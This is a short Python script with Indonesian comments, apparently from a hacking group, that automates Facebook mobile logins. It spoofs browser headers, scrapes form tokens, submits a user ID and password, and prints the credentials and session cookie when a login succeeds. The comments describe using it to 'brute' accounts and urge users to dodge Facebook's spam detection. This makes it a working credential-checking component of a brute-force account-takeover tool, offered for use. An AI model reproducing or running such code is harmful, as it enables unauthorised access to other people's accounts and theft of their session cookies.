import requests, re

# METODE FACEBOOK 04 JUNI 2022

# PERHATIAN METODE INI MUDAH TERKENA SPAM
# MAKA DARI ITU USAHA SENDIRI YA BIAR KAGAK TERKENA SPAM DI SAAT BRUTE
# PAKE AKAL LAH GIMANA BIAR TIDAK TERKENA SPAM

# SALAM DARI SAYA BOY HAMZAH

# TEAM XNSCODE PRIVATE ONLINE

user = "" # Masukan ID FB mu
pw = "" # Masukan Sandi FB mu

def cek(): 
	session=requests.Session()
	dat = {}
	url = session.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
	das = {"Host": "m.facebook.com","connection":"keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","x-requested-with": "mark.via.gp","dnt": "1","sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"'Android'","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-user": "?1","sec-fetch-dest": "document","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","referer": "https://m.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin","accept-encoding": "gzip, deflate","accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"}
	dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
	xx = session.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
	if "c_user" in session.cookies.get_dict().keys():
		cookie =";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
		print(f" ✓ {user} - {pw} - {cookie}")
	elif "checkpoint" in session.cookies.get_dict().keys():
		print(f" ✖️ {user} - {pw}")
		
cek()
